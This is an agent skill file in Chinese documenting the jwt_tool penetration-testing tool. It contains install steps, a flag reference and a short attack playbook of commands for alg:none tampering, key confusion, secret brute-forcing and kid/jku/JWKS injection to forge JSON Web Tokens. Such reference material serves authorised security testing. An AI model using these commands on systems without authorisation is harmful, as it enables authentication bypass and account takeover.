---
name: jwt-tool-token
description: 渗透工具 skill:jwt_tool 的安装、参数速查与攻击场景 playbook。当任务涉及 API与业务逻辑攻击 需要调用 jwt_tool 时使用。
---

# jwt_tool

- 攻击大类:C10 API与业务逻辑攻击
- 上游仓库:https://github.com/ticarpi/jwt_tool
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python jwt_tool.py <JWT>` | 令牌全面体检 |
| `-M at` | 篡改(alg none/RS256→HS256) |
| `-C` | 离线破解字典 |
| `-X a` | 暴力 all |
| `-I` | 注入标称(伪造 kid/jwk/x5u) |
| `-T` | 重放令牌 |
| `-jw` | JWKS 注入 |
| `-Q` | 查询过期/生效 |

## 攻击场景 Playbook

### JWT 五连击

```bash
python jwt_tool.py eyJhbG... -M at  # 自动尝试 alg:none/密钥混淆/弱签名
python jwt_tool.py eyJhbG... -C -d secrets.txt  # HS256 密钥爆破
python jwt_tool.py eyJhbG... -X i -I  # 尝试 kid 注入伪造签名
```

### jku/x5u 注入拿服务端公钥欺骗

```bash
python jwt_tool.py eyJhbG... -M i  # 自动探测 jwks 注入点并构造 PoC
```

## 注意事项

JWT 安全测试事实标准;支持 30+ 攻击模式含 2023 新出的混淆与注入面。
